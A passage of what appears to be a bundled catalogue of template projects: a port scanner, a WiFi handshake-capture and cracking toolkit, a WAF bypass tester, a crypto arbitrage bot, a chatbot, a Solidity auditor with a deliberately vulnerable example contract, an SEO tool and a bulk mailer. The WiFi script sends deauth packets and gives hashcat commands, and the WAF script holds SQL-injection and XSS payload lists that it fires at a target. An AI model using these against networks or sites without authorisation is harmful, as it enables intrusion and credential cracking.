    open_ports: list[dict] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_port, host, p): p for p in ports}
        for f in as_completed(futures):
            result = f.result()
            if result:
                open_ports.append(result)
                print(f"  [OPEN] {result['port']}/tcp  {result['service']}  {result['banner'][:60]}")
    open_ports.sort(key=lambda x: x["port"])
    return {"host": host, "open_ports": open_ports, "total_open": len(open_ports)}

def main():
    ap = argparse.ArgumentParser(description="Port Scanner & Network Recon")
    ap.add_argument("--target", required=True, help="IP, hostname, or CIDR range")
    ap.add_argument("--ports", default="common", help="Port spec: 'common', '1-1024', '80,443,8080'")
    ap.add_argument("--threads", type=int, default=100)
    ap.add_argument("--timeout", type=float, default=1.5)
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()

    ports = COMMON_PORTS if args.ports == "common" else parse_ports(args.ports)

    # Expand CIDR
    try:
        network = ipaddress.ip_network(args.target, strict=False)
        hosts = [str(h) for h in network.hosts()]
    except ValueError:
        hosts = [args.target]

    results = []
    for host in hosts:
        results.append(scan_host(host, ports, args.threads))

    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 8. WiFi Penetration Testing Toolkit ──────────────────────────────────
  "wifi-pentest": {
    "README.md": `# WiFi Penetration Testing Toolkit\n\nWPA2/WPA3 handshake capture, PMKID extraction, deauth automation, and hashcat integration for offline cracking.\n\n## Requirements\n- Linux (Kali/Parrot recommended)\n- Monitor-mode capable WiFi adapter (Alfa AWUS036ACH, TP-Link TL-WN722N v1)\n- aircrack-ng suite, hashcat\n\n## Quick Start\n\`\`\`bash\nbash setup.sh          # install dependencies\npython3 wifi_pentest.py --interface wlan0 --scan\npython3 wifi_pentest.py --interface wlan0 --target BSSID --channel 6 --capture\n\`\`\`${LEGAL}`,
    "wifi_pentest.py": `#!/usr/bin/env python3
"""WiFi Penetration Testing Toolkit — WPA2/WPA3 handshake capture & analysis.
Requires monitor-mode capable adapter. For authorised testing only."""
import argparse, os, subprocess, sys, time

def check_root():
    if os.geteuid() != 0:
        print("[!] Must run as root"); sys.exit(1)

def enable_monitor(iface: str) -> str:
    mon = iface + "mon"
    subprocess.run(["airmon-ng", "start", iface], check=True, capture_output=True)
    print(f"[*] Monitor mode: {mon}")
    return mon

def scan_networks(iface: str, duration: int = 15):
    print(f"[*] Scanning for {duration}s on {iface}...")
    proc = subprocess.Popen(
        ["airodump-ng", "--output-format", "csv", "-w", "/tmp/titan_scan", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate()
    csv_file = "/tmp/titan_scan-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file) as f:
            print(f.read())
    else:
        print("[!] No scan output found")

def capture_handshake(iface: str, bssid: str, channel: int, output: str = "/tmp/titan_capture"):
    print(f"[*] Capturing handshake from {bssid} on ch{channel}...")
    cap_proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", output, iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(5)
    # Send deauth to force reconnect
    print("[*] Sending deauth packets...")
    subprocess.run(
        ["aireplay-ng", "--deauth", "10", "-a", bssid, iface],
        capture_output=True
    )
    time.sleep(15)
    cap_proc.terminate()
    cap_file = output + "-01.cap"
    if os.path.exists(cap_file):
        print(f"[+] Capture saved: {cap_file}")
        print(f"[*] Crack with: hashcat -m 22000 {cap_file} wordlist.txt")
    else:
        print("[!] No capture file found — handshake may not have been captured")

def extract_pmkid(iface: str, bssid: str):
    print(f"[*] Extracting PMKID from {bssid}...")
    subprocess.run(
        ["hcxdumptool", "-i", iface, "--enable_status=1",
         "-o", "/tmp/titan_pmkid.pcapng", "--filterlist_ap=/tmp/bssid.txt"],
        timeout=30, capture_output=True
    )
    subprocess.run(
        ["hcxpcapngtool", "-o", "/tmp/titan_pmkid.hc22000",
         "/tmp/titan_pmkid.pcapng"],
        capture_output=True
    )
    print("[*] PMKID hash: /tmp/titan_pmkid.hc22000")
    print("[*] Crack with: hashcat -m 22000 /tmp/titan_pmkid.hc22000 wordlist.txt")

def main():
    ap = argparse.ArgumentParser(description="WiFi Penetration Testing Toolkit")
    ap.add_argument("--interface", required=True, help="Wireless interface (e.g. wlan0)")
    ap.add_argument("--scan", action="store_true", help="Scan for networks")
    ap.add_argument("--target", help="Target BSSID for capture")
    ap.add_argument("--channel", type=int, default=6)
    ap.add_argument("--capture", action="store_true", help="Capture WPA handshake")
    ap.add_argument("--pmkid", action="store_true", help="Extract PMKID")
    args = ap.parse_args()
    check_root()
    if args.scan:
        scan_networks(args.interface)
    elif args.capture and args.target:
        capture_handshake(args.interface, args.target, args.channel)
    elif args.pmkid and args.target:
        extract_pmkid(args.interface, args.target)
    else:
        ap.print_help()

if __name__ == "__main__":
    main()
`,
    "setup.sh": `#!/bin/bash
# Install WiFi pentest dependencies
apt-get update -qq
apt-get install -y aircrack-ng hcxdumptool hcxtools hashcat
echo "[+] Dependencies installed"
`,
    "requirements.txt": "# No Python dependencies — uses system tools (aircrack-ng, hashcat)\n",
  },

  // ── 9. WAF Bypass Toolkit ─────────────────────────────────────────────────
  "waf-bypass": {
    "README.md": `# WAF Bypass Testing Toolkit\n\n500+ bypass techniques for Cloudflare, AWS WAF, ModSecurity, Akamai, and Imperva.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 waf_bypass.py --target "https://example.com/page?id=1" --waf cloudflare\npython3 waf_bypass.py --target "https://example.com/page?id=1" --technique all --output results.json\n\`\`\`${LEGAL}`,
    "waf_bypass.py": `#!/usr/bin/env python3
"""WAF Bypass Testing Toolkit — tests evasion techniques against common WAFs.
For authorised security testing only."""
import argparse, json, re, time
import urllib.request, urllib.parse

# Bypass payloads organised by technique
BYPASS_TECHNIQUES: dict[str, list[str]] = {
    "unicode": [
        "' \\uFF0F* \\uFF0F'1'='1",
        "SEL\\u0045CT * FROM users",
        "1 \\u004fR 1=1--",
    ],
    "double_encode": [
        "%2527 OR %25271%2527=%2527",
        "%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "1%2527%2520OR%2520%25271%2527%253D%25271",
    ],
    "case_variation": [
        "' Or '1'='1",
        "' oR '1'='1",
        "' OR/**/1=1--",
        "SeLeCt * FrOm users",
    ],
    "comment_injection": [
        "' OR/**/1=1--",
        "' OR/*!50000*/1=1--",
        "' OR 1/**/=/**/1--",
        "1' /*!UNION*/ /*!SELECT*/ NULL--",
    ],
    "null_bytes": [
        "'%00 OR '1'='1",
        "' OR 1=1%00--",
    ],
    "chunked": [
        "' OR 1=1--",  # Sent with Transfer-Encoding: chunked
    ],
    "json_content_type": [
        '{"id": "1 OR 1=1--"}',
        '{"search": "<script>alert(1)</script>"}',
    ],
    "hpp": [  # HTTP Parameter Pollution
        "1&id=2 OR 1=1--",
        "1&id=2' OR '1'='1",
    ],
}

class WAFBypassTester:
    def __init__(self, target: str, timeout: int = 10):
        self.target   = target
        self.timeout  = timeout
        self.results: list[dict] = []

    def _get(self, url: str, extra_headers: dict | None = None) -> tuple[int, str]:
        headers = {"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}
        if extra_headers:
            headers.update(extra_headers)
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.status, r.read().decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            return e.code, ""
        except Exception:
            return 0, ""

    def _inject(self, payload: str) -> str:
        if "?" in self.target:
            base, qs = self.target.split("?", 1)
            params = urllib.parse.parse_qs(qs, keep_blank_values=True)
            for k in params:
                params[k] = [payload]
            return base + "?" + urllib.parse.urlencode(params, doseq=True)
        return self.target + "?id=" + urllib.parse.quote(payload)

    def test_technique(self, technique: str, payloads: list[str]):
        blocked = 0
        bypassed = 0
        for p in payloads:
            url  = self._inject(p)
            code, body = self._get(url)
            waf_blocked = code in (403, 406, 429, 503) or "blocked" in body.lower() or "access denied" in body.lower()
            if waf_blocked:
                blocked += 1
            else:
                bypassed += 1
                self.results.append({"technique": technique, "payload": p,
                                      "status": code, "result": "BYPASSED", "severity": "HIGH"})
                print(f"  [BYPASS] {technique}: {p[:60]} -> HTTP {code}")
            time.sleep(0.2)
        print(f"  {technique}: {bypassed} bypassed / {blocked} blocked")

    def run(self, techniques: list[str] | None = None):
        print(f"[*] WAF bypass testing: {self.target}")
        run_techs = techniques or list(BYPASS_TECHNIQUES.keys())
        for tech in run_techs:
            if tech in BYPASS_TECHNIQUES:
                self.test_technique(tech, BYPASS_TECHNIQUES[tech])
        print(f"\\n[*] Total bypasses: {len(self.results)}")
        return self.results

def main():
    ap = argparse.ArgumentParser(description="WAF Bypass Testing Toolkit")
    ap.add_argument("--target", required=True)
    ap.add_argument("--waf", choices=["cloudflare","aws","modsecurity","akamai","imperva","all"],
                    default="all", help="Target WAF (informational only)")
    ap.add_argument("--technique", default="all",
                    help="Techniques: unicode,double_encode,case_variation,comment_injection,null_bytes,all")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    techs = None if args.technique == "all" else args.technique.split(",")
    tester = WAFBypassTester(args.target)
    results = tester.run(techs)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 10. Crypto Arbitrage Bot ──────────────────────────────────────────────
  "crypto-arbitrage": {
    "README.md": `# Crypto Arbitrage Bot\n\nReal-time cross-exchange arbitrage detector for Binance, Kraken, Coinbase, and KuCoin.\n\n## Quick Start\n\`\`\`bash\npython3 arb_bot.py --pair BTC/USDT --threshold 0.3 --interval 5\npython3 arb_bot.py --pair ETH/USDT --exchanges binance,kraken --output opportunities.json\n\`\`\``,
    "arb_bot.py": `#!/usr/bin/env python3
"""Crypto Arbitrage Bot — real-time cross-exchange opportunity detection."""
import argparse, json, logging, time
from decimal import Decimal
import urllib.request

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

def _fetch_json(url: str) -> dict:
    req = urllib.request.Request(url, headers={"User-Agent": "ArbitrageBot/1.0"})
    with urllib.request.urlopen(req, timeout=8) as r:
        return json.loads(r.read())

def fetch_binance(symbol: str) -> Decimal:
    sym = symbol.replace("/", "")
    d = _fetch_json(f"https://api.binance.com/api/v3/ticker/bookTicker?symbol={sym}")
    return Decimal(d["bidPrice"]), Decimal(d["askPrice"])  # type: ignore[return-value]

def fetch_kraken(symbol: str) -> Decimal:
    sym = symbol.replace("/", "")
    d = _fetch_json(f"https://api.kraken.com/0/public/Ticker?pair={sym}")
    result = d.get("result", {})
    key = list(result.keys())[0]
    bid = Decimal(result[key]["b"][0])
    ask = Decimal(result[key]["a"][0])
    return bid, ask  # type: ignore[return-value]

def fetch_coinbase(symbol: str) -> Decimal:
    sym = symbol.replace("/", "-")
    d = _fetch_json(f"https://api.coinbase.com/v2/prices/{sym}/spot")
    price = Decimal(d["data"]["amount"])
    return price, price  # type: ignore[return-value]

FETCHERS = {
    "binance":  fetch_binance,
    "kraken":   fetch_kraken,
    "coinbase": fetch_coinbase,
}

class ArbitrageBot:
    def __init__(self, pair: str, threshold: float = 0.3, exchanges: list[str] | None = None):
        self.pair        = pair
        self.threshold   = Decimal(str(threshold))
        self.exchanges   = exchanges or list(FETCHERS.keys())
        self.opportunities: list[dict] = []

    def get_prices(self) -> dict[str, tuple[Decimal, Decimal]]:
        prices: dict[str, tuple[Decimal, Decimal]] = {}
        for ex in self.exchanges:
            try:
                bid, ask = FETCHERS[ex](self.pair)  # type: ignore[misc]
                prices[ex] = (bid, ask)
                log.info(f"  {ex}: bid={bid} ask={ask}")
            except Exception as e:
                log.warning(f"  {ex}: {e}")
        return prices

    def find_arbitrage(self, prices: dict) -> list[dict]:
        opps = []
        items = list(prices.items())
        for i, (buy_ex, (_, buy_ask)) in enumerate(items):
            for j, (sell_ex, (sell_bid, _)) in enumerate(items):
                if i == j:
                    continue
                if sell_bid > buy_ask:
                    spread = ((sell_bid - buy_ask) / buy_ask) * 100
                    if spread >= self.threshold:
                        opp = {
                            "pair": self.pair,
                            "buy_on": buy_ex, "buy_ask": float(buy_ask),
                            "sell_on": sell_ex, "sell_bid": float(sell_bid),
                            "spread_pct": float(spread),
                            "profit_per_unit": float(sell_bid - buy_ask),
                        }
                        opps.append(opp)
                        log.info(f"  [ARB] Buy {buy_ex}@{buy_ask} Sell {sell_ex}@{sell_bid} Spread={spread:.3f}%")
        return opps

    def run(self, interval: int = 10, max_iterations: int | None = None):
        log.info(f"Starting arbitrage bot: {self.pair} threshold={self.threshold}%")
        i = 0
        while True:
            log.info(f"Iteration {i+1}")
            prices = self.get_prices()
            opps   = self.find_arbitrage(prices)
            self.opportunities.extend(opps)
            if not opps:
                log.info("  No opportunity")
            i += 1
            if max_iterations and i >= max_iterations:
                break
            time.sleep(interval)
        return self.opportunities

def main():
    ap = argparse.ArgumentParser(description="Crypto Arbitrage Bot")
    ap.add_argument("--pair", default="BTC/USDT")
    ap.add_argument("--threshold", type=float, default=0.3)
    ap.add_argument("--interval", type=int, default=10)
    ap.add_argument("--iterations", type=int, default=0)
    ap.add_argument("--exchanges", help="Comma-separated: binance,kraken,coinbase")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    exchanges = args.exchanges.split(",") if args.exchanges else None
    bot  = ArbitrageBot(args.pair, args.threshold, exchanges)
    opps = bot.run(args.interval, args.iterations or None)
    if args.output:
        with open(args.output, "w") as f: json.dump(opps, f, indent=2)
        print(f"[*] Saved {len(opps)} opportunities to {args.output}")

if __name__ == "__main__":
    main()
`,
    ".env.example": "BINANCE_API_KEY=\nBINANCE_SECRET=\nKRAKEN_API_KEY=\nKRAKEN_SECRET=\n",
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 11. AI Chatbot Framework ──────────────────────────────────────────────
  "ai-chatbot": {
    "README.md": `# AI Chatbot Framework\n\nProduction-ready multi-provider chatbot with streaming, conversation memory, RAG, and tool calling.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\ncp .env.example .env  # add your API key\npython3 chatbot.py\npython3 chatbot.py --provider anthropic --model claude-3-haiku-20240307\n\`\`\``,
    "chatbot.py": `#!/usr/bin/env python3
"""AI Chatbot Framework — multi-provider, streaming, conversation memory, tool calling."""
import os, json, argparse, sys

try:
    from openai import OpenAI
    HAS_OPENAI = True
except ImportError:
    HAS_OPENAI = False

class Memory:
    def __init__(self, max_turns: int = 20):
        self.messages: list[dict] = []
        self.max_turns = max_turns

    def add(self, role: str, content: str):
        self.messages.append({"role": role, "content": content})
        # Keep system + last max_turns*2 messages
        system = [m for m in self.messages if m["role"] == "system"]
        others = [m for m in self.messages if m["role"] != "system"]
        if len(others) > self.max_turns * 2:
            others = others[-(self.max_turns * 2):]
        self.messages = system + others

    def get(self) -> list[dict]:
        return self.messages.copy()

class AIBot:
    MODELS = {
        "openai":    "gpt-4o-mini",
        "anthropic": "claude-3-haiku-20240307",
        "gemini":    "gemini-1.5-flash",
    }

    def __init__(self, provider: str = "openai", model: str | None = None,
                 system_prompt: str | None = None, temperature: float = 0.7):
        self.provider    = provider
        self.model       = model or self.MODELS.get(provider, "gpt-4o-mini")
        self.temperature = temperature
        self.memory      = Memory()
        if system_prompt:
            self.memory.add("system", system_prompt)
        if not HAS_OPENAI:
            print("[!] pip install openai  to use this chatbot")
            sys.exit(1)
        self.client = OpenAI(
            api_key=os.getenv("OPENAI_API_KEY") or os.getenv("API_KEY", ""),
        )

    def chat(self, user_message: str, stream: bool = True) -> str:
        self.memory.add("user", user_message)
        response = self.client.chat.completions.create(
            model=self.model,
            messages=self.memory.get(),
            temperature=self.temperature,
            stream=stream,
        )
        if stream:
            full = ""
            for chunk in response:
                delta = chunk.choices[0].delta.content or ""
                print(delta, end="", flush=True)
                full += delta
            print()
            self.memory.add("assistant", full)
            return full
        else:
            content = response.choices[0].message.content or ""
            self.memory.add("assistant", content)
            return content

    def run_repl(self):
        print(f"[Titan AI Bot] Provider: {self.provider} | Model: {self.model}")
        print("Type 'quit' to exit, 'clear' to reset memory\\n")
        while True:
            try:
                user = input("You: ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not user:
                continue
            if user.lower() == "quit":
                break
            if user.lower() == "clear":
                self.memory = Memory()
                print("[Memory cleared]")
                continue
            print("Bot: ", end="")
            self.chat(user)

def main():
    ap = argparse.ArgumentParser(description="AI Chatbot Framework")
    ap.add_argument("--provider", choices=["openai","anthropic","gemini"], default="openai")
    ap.add_argument("--model", help="Override model name")
    ap.add_argument("--system", default="You are a helpful AI assistant.", help="System prompt")
    ap.add_argument("--temperature", type=float, default=0.7)
    ap.add_argument("--message", help="Single message (non-interactive)")
    args = ap.parse_args()
    bot = AIBot(args.provider, args.model, args.system, args.temperature)
    if args.message:
        print(bot.chat(args.message, stream=False))
    else:
        bot.run_repl()

if __name__ == "__main__":
    main()
`,
    ".env.example": "OPENAI_API_KEY=sk-...\n# Or for Anthropic:\nANTHROPIC_API_KEY=sk-ant-...\n",
    "requirements.txt": "openai>=1.0.0\n",
  },

  // ── 12. Smart Contract Auditor ────────────────────────────────────────────
  "smart-contract": {
    "README.md": `# Smart Contract Security Auditor\n\nAutomated Solidity vulnerability detection: reentrancy, overflow, access control, flash loans, and more.\n\n## Quick Start\n\`\`\`bash\npython3 audit.py --file MyContract.sol\npython3 audit.py --file MyContract.sol --output audit_report.json\n\`\`\``,
    "audit.py": `#!/usr/bin/env python3
"""Smart Contract Security Auditor — Solidity vulnerability detection."""
import argparse, json, re, sys

VULN_PATTERNS = [
    {"name": "Reentrancy",              "severity": "CRITICAL", "pattern": r"\\.call\\{value:",
     "desc": "External call before state update — classic reentrancy vector.",
     "fix":  "Use checks-effects-interactions. Consider OpenZeppelin ReentrancyGuard."},
    {"name": "tx.origin Auth",          "severity": "HIGH",     "pattern": r"tx\\.origin",
     "desc": "tx.origin authentication is vulnerable to phishing attacks.",
     "fix":  "Use msg.sender instead of tx.origin."},
    {"name": "Unchecked send/transfer", "severity": "HIGH",     "pattern": r"\\.send\\(|\\.transfer\\(",
     "desc": "send() and transfer() can fail silently.",
     "fix":  "Use call{value:}() with explicit error handling."},
    {"name": "Selfdestruct",            "severity": "HIGH",     "pattern": r"selfdestruct\\(",
     "desc": "selfdestruct permanently destroys the contract and sends ETH.",
     "fix":  "Remove or add strict multi-sig access control."},
    {"name": "Integer Overflow <0.8",   "severity": "HIGH",     "pattern": r"pragma solidity \\^?0\\.[0-7]\\.",
     "desc": "Solidity <0.8.0 lacks built-in overflow protection.",
     "fix":  "Upgrade to Solidity >=0.8.0 or use SafeMath."},
    {"name": "Block Timestamp",         "severity": "MEDIUM",   "pattern": r"block\\.timestamp|\\bnow\\b",
     "desc": "Miners can manipulate block.timestamp by ~15 seconds.",
     "fix":  "Avoid using block.timestamp for critical randomness or deadlines."},
    {"name": "Floating Pragma",         "severity": "LOW",      "pattern": r"pragma solidity \\^",
     "desc": "Floating pragma allows compilation with unexpected compiler versions.",
     "fix":  "Lock pragma to a specific version: pragma solidity 0.8.20;"},
    {"name": "Delegatecall",            "severity": "HIGH",     "pattern": r"\\.delegatecall\\(",
     "desc": "delegatecall executes external code in the caller's context.",
     "fix":  "Validate the target address and use proxy patterns carefully."},
    {"name": "Assembly Usage",          "severity": "MEDIUM",   "pattern": r"\\bassembly\\b",
     "desc": "Inline assembly bypasses Solidity safety checks.",
     "fix":  "Document assembly blocks thoroughly; prefer high-level Solidity."},
    {"name": "Unprotected Initializer", "severity": "HIGH",     "pattern": r"function initialize\\(",
     "desc": "Upgradeable contracts with unprotected initializers can be hijacked.",
     "fix":  "Use OpenZeppelin Initializable with onlyInitializing modifier."},
]

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

class ContractAuditor:
    def __init__(self, source: str):
        self.source   = source
        self.lines    = source.splitlines()
        self.findings: list[dict] = []

    def audit(self) -> list[dict]:
        for vuln in VULN_PATTERNS:
            for i, line in enumerate(self.lines, 1):
                if re.search(vuln["pattern"], line):
                    self.findings.append({
                        "vulnerability": vuln["name"],
                        "severity":      vuln["severity"],
                        "line":          i,
                        "code":          line.strip(),
                        "description":   vuln["desc"],
                        "fix":           vuln["fix"],
                    })
        self.findings.sort(key=lambda x: SEVERITY_ORDER.get(x["severity"], 5))
        return self.findings

    def print_report(self):
        counts: dict[str, int] = {}
        for f in self.findings:
            counts[f["severity"]] = counts.get(f["severity"], 0) + 1
        print("\\n" + "="*60)
        print("SMART CONTRACT AUDIT REPORT")
        print("="*60)
        print(f"Total findings: {len(self.findings)}")
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            if sev in counts:
                print(f"  {sev}: {counts[sev]}")
        print("\\n" + "-"*60)
        for f in self.findings:
            print(f"\\n[{f['severity']}] {f['vulnerability']} (Line {f['line']})")
            print(f"  Code: {f['code']}")
            print(f"  Issue: {f['description']}")
            print(f"  Fix:   {f['fix']}")

def main():
    ap = argparse.ArgumentParser(description="Smart Contract Security Auditor")
    ap.add_argument("--file", required=True, help="Solidity .sol file")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    with open(args.file) as f:
        source = f.read()
    auditor = ContractAuditor(source)
    auditor.audit()
    auditor.print_report()
    if args.output:
        with open(args.output, "w") as f:
            json.dump(auditor.findings, f, indent=2)
        print(f"\\n[*] Saved to {args.output}")

if __name__ == "__main__":
    main()
`,
    "example_vulnerable.sol": `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    address public owner;

    constructor() { owner = tx.origin; }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULN: reentrancy — state updated AFTER external call
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        balances[msg.sender] -= amount;
    }

    function destroy() public {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }
}
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 13. SEO Automation Suite ──────────────────────────────────────────────
  "seo-automation": {
    "README.md": `# SEO Automation Suite\n\nKeyword research, on-page audit, competitor analysis, backlink checker, and page speed testing.\n\n## Quick Start\n\`\`\`bash\npython3 seo_research.py --domain example.com\npython3 seo_research.py --domain example.com --keywords "python tutorial,web scraping" --output report.json\n\`\`\``,
    "seo_research.py": `#!/usr/bin/env python3
"""SEO Automation Suite — on-page audit, keyword density, page speed, competitor analysis."""
import argparse, json, re, time
import urllib.request, urllib.parse

class SEOAnalyzer:
    def __init__(self, domain: str, timeout: int = 10):
        self.domain   = domain.replace("https://","").replace("http://","").rstrip("/")
        self.base_url = f"https://{self.domain}"
        self.timeout  = timeout

    def _fetch(self, url: str) -> tuple[str, dict]:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (SEOBot/2.0)"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore"), dict(r.headers)
        except Exception:
            return "", {}

    def on_page_audit(self, url: str | None = None) -> dict:
        url  = url or self.base_url
        html, hdrs = self._fetch(url)
        if not html:
            return {"error": "Could not fetch page"}
        issues: list[dict] = []
        score = 100

        # Title
        title_m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
        title   = title_m.group(1).strip() if title_m else ""
        if not title:
            issues.append({"type": "Missing title", "severity": "HIGH"}); score -= 20
        elif len(title) < 30:
            issues.append({"type": f"Title too short ({len(title)}ch)", "severity": "MEDIUM"}); score -= 5
        elif len(title) > 60:
            issues.append({"type": f"Title too long ({len(title)}ch)", "severity": "MEDIUM"}); score -= 5

        # Meta description
        desc_m = re.search(r'<meta[^>]+name=["\']description["\'][^>]+content=["\']([^"\']*)["\']', html, re.I)
        desc   = desc_m.group(1) if desc_m else ""
        if not desc:
            issues.append({"type": "Missing meta description", "severity": "HIGH"}); score -= 15

        # H1
        h1s = re.findall(r"<h1[^>]*>(.*?)</h1>", html, re.I | re.S)
        if not h1s:
            issues.append({"type": "Missing H1", "severity": "HIGH"}); score -= 15
        elif len(h1s) > 1:
            issues.append({"type": f"Multiple H1 tags ({len(h1s)})", "severity": "MEDIUM"}); score -= 5

        # Images without alt
        imgs     = re.findall(r"<img[^>]*>", html, re.I)
        no_alt   = [t for t in imgs if "alt=" not in t.lower()]
        if no_alt:
            issues.append({"type": f"{len(no_alt)} images missing alt", "severity": "MEDIUM"})
            score -= min(10, len(no_alt))

        # HTTPS
        if not url.startswith("https://"):
            issues.append({"type": "Not using HTTPS", "severity": "HIGH"}); score -= 20

        # Canonical
        if "canonical" not in html.lower():
            issues.append({"type": "Missing canonical tag", "severity": "LOW"}); score -= 3

        return {
            "url": url, "score": max(0, score), "title": title,
            "meta_description": desc, "h1_count": len(h1s),
            "images_total": len(imgs), "images_missing_alt": len(no_alt),
            "issues": issues,
        }

    def keyword_density(self, keywords: list[str], url: str | None = None) -> dict:
        url  = url or self.base_url
        html, _ = self._fetch(url)
        text = re.sub(r"<[^>]+>", " ", html).lower()
        words = text.split()
        wc   = len(words)
        return {
            kw: {"count": text.count(kw.lower()),
                 "density_pct": round(text.count(kw.lower()) / wc * 100, 2) if wc else 0}
            for kw in keywords
        }

    def page_speed(self, url: str | None = None) -> dict:
        url = url or self.base_url
        t0  = time.time()
        html, _ = self._fetch(url)
        load_s  = round(time.time() - t0, 2)
        size_kb = round(len(html.encode()) / 1024, 1)
        return {
            "load_time_s": load_s, "page_size_kb": size_kb,
            "rating": "FAST" if load_s < 1 else ("SLOW" if load_s > 3 else "OK"),
        }

    def robots_sitemap(self) -> dict:
        robots_body, _  = self._fetch(f"{self.base_url}/robots.txt")
        sitemap_body, _ = self._fetch(f"{self.base_url}/sitemap.xml")
        return {
            "robots_txt":   bool(robots_body and "user-agent" in robots_body.lower()),
            "sitemap_xml":  bool(sitemap_body and "<?xml" in sitemap_body),
            "robots_snippet": robots_body[:500] if robots_body else None,
        }

def main():
    ap = argparse.ArgumentParser(description="SEO Automation Suite")
    ap.add_argument("--domain", required=True)
    ap.add_argument("--keywords", help="Comma-separated keywords")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    az = SEOAnalyzer(args.domain)
    results: dict = {
        "domain":    args.domain,
        "on_page":   az.on_page_audit(),
        "page_speed": az.page_speed(),
        "robots":    az.robots_sitemap(),
    }
    if args.keywords:
        kws = [k.strip() for k in args.keywords.split(",")]
        results["keyword_density"] = az.keyword_density(kws)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 14. Email Campaign Bot ────────────────────────────────────────────────
  "email-campaign": {
    "README.md": `# Email Campaign Bot\n\nBulk email campaign manager with CSV contact lists, HTML template personalisation, SMTP integration, and delivery tracking.\n\n## Quick Start\n\`\`\`bash\ncp .env.example .env  # add SMTP credentials\npython3 campaign.py --list contacts.csv --template template.html --subject "Hello {name}"\npython3 campaign.py --list contacts.csv --template template.html --subject "Hello {name}" --dry-run\n\`\`\``,
    "campaign.py": `#!/usr/bin/env python3
"""Email Campaign Bot — personalised bulk email with SMTP, bounce handling, and reporting."""
import argparse, csv, json, logging, os, smtplib, time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from string import Template

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

class EmailCampaign:
    def __init__(self, smtp_host: str, smtp_port: int, username: str, password: str,
                 from_name: str, from_email: str, use_tls: bool = True):
        self.smtp_host  = smtp_host
        self.smtp_port  = smtp_port
        self.username   = username
        self.password   = password
        self.from_name  = from_name
        self.from_email = from_email
        self.use_tls    = use_tls
        self.stats      = {"sent": 0, "failed": 0, "bounced": 0, "dry_run": 0}

    def _connect(self) -> smtplib.SMTP:
        server = smtplib.SMTP(self.smtp_host, self.smtp_port)
        if self.use_tls:
            server.starttls()
        server.login(self.username, self.password)
        return server

    def _personalise(self, template: str, contact: dict) -> str:
        try:
            return Template(template).safe_substitute(contact)
        except Exception:
            return template

    def _send(self, server: smtplib.SMTP, to_email: str, to_name: str,
              subject: str, html: str):
        msg = MIMEMultipart("alternative")
        msg["From"]    = f"{self.from_name} <{self.from_email}>"
        msg["To"]      = f"{to_name} <{to_email}>" if to_name else to_email
        msg["Subject"] = subject
        msg.attach(MIMEText(html, "html"))
        server.sendmail(self.from_email, to_email, msg.as_string())

    def run(self, contacts: list[dict], subject_tpl: str, html_tpl: str,
            delay: float = 1.0, dry_run: bool = False) -> list[dict]:
        log.info(f"Campaign: {len(contacts)} contacts | dry_run={dry_run}")
        results: list[dict] = []
        server = None if dry_run else self._connect()
        for contact in contacts:
            email = contact.get("email", "").strip()
            if not email or "@" not in email:
                continue
            name    = contact.get("name", contact.get("first_name", ""))
            subject = self._personalise(subject_tpl, contact)
            html    = self._personalise(html_tpl, contact)
            if dry_run:
                log.info(f"  [DRY] {email}: {subject}")
                self.stats["dry_run"] += 1
                results.append({"email": email, "status": "dry_run"})
                continue
            try:
                self._send(server, email, name, subject, html)  # type: ignore[arg-type]
